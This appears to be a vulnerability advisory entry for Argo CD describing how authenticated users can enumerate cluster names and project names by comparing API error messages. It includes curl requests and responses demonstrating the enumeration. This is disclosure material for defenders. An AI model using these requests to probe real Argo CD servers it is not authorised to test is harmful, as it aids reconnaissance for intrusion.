summary: Argo-cd authenticated users can enumerate clusters by name in github.com/argoproj/argo-cd
description: |-
    ### Impact It’s possible for authenticated users to enumerate clusters by name
    by inspecting error messages:

    ``` $ curl -k 'https://localhost:8080/api/v1/clusters/in-cluster?id.type=name'
    -H "Authorization: Bearer $token" {"error":"permission denied: clusters, get, ,
    sub: alice, iat: 2022-11-04T20:25:44Z","code":7,"message":"permission denied:
    clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z"}⏎

    $ curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name'
    -H "Authorizati on: Bearer $token" {"error":"permission
    denied","code":7,"message":"permission denied"} ```

    It’s also possible to enumerate the names of projects with project-scoped
    clusters if you know the names of the clusters. ``` curl -k
    'https://localhost:8080/api/v1/clusters/in-cluster-project?id.type=name' -H
    "Authorization: Bearer $token" {"error":"permission denied: clusters, get,
    default/, sub: alice, iat: 2022-11-04T20:25:44Z","code":7,"message":"permission
    denied: clusters, get, default/, sub: alice, iat: 2022-11-04T20:25:44Z"}

    curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name' -H
    "Authorization: Bearer $token" {"error":"permission
    denied","code":7,"message":"permission denied"} ```
